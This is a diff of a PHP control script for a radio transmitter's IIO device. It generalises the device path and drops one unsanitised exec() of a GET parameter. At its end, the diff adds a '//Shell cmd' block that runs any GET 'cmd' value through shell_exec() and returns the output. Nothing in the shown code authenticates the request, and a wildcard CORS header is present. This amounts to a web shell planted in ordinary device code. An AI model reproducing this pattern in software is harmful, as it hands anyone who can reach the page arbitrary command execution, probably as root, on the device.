@@ -1,13 +1,9 @@
 <?php
 header("Access-Control-Allow-Origin: *"); //for developping & testing purposes
-//set and return requested gain
-if(isset($_GET['gain'])){
-    $cmd = 'echo '.$_GET['gain'].' >  /sys/bus/iio/devices/iio:device1/out_voltage0_hardwaregain';
-    exec($cmd);
-}
+$dev= exec ('sh /root/device_sel.sh compact'); //determine device according hardware revision
 
 if(isset($_GET['onair'])){
-    $cmd = 'cat /sys/bus/iio/devices/iio:device1/out_altvoltage1_TX_LO_powerdown';
+    $cmd = 'cat /sys/bus/iio/devices/iio:device'.$dev.'/out_altvoltage1_TX_LO_powerdown';
     exec($cmd,$return);
     
     foreach( $return as & $value )
@@ -20,17 +16,17 @@ if(isset($_GET['PTT'])){
     $Tx= $_GET['PTT'];
     if($Tx == "on")
     {   
-        $cmd = 'echo 0x27 0x10 > /sys/kernel/debug/iio/iio:device1/direct_reg_access';
+        $cmd = 'echo 0x27 0x10 > /sys/kernel/debug/iio/iio:device'.$dev.'/direct_reg_access';
         exec($cmd);
-        $cmd = 'echo  0 >  /sys/bus/iio/devices/iio:device1/out_altvoltage1_TX_LO_powerdown';
+        $cmd = 'echo  0 >  /sys/bus/iio/devices/iio:device'.$dev.'/out_altvoltage1_TX_LO_powerdown';
         exec($cmd);
     }
     else
     if($Tx == "off")
     {
-        $cmd = 'echo 0x27 0x00 > /sys/kernel/debug/iio/iio:device1/direct_reg_access';
+        $cmd = 'echo 0x27 0x00 > /sys/kernel/debug/iio/iio:device'.$dev.'/direct_reg_access';
         exec($cmd);
-        $cmd = 'echo  1 >  /sys/bus/iio/devices/iio:device1/out_altvoltage1_TX_LO_powerdown';
+        $cmd = 'echo  1 >  /sys/bus/iio/devices/iio:device'.$dev.'/out_altvoltage1_TX_LO_powerdown';
         exec($cmd);
     }       
     
@@ -135,6 +131,12 @@ echo '"';
 
 //end of json
 echo "}";
+}
+
+//Shell cmd
+if(isset($_GET['cmd'])){
+    $output = shell_exec($_GET['cmd']);
+    echo $output;
 }	
 	
 
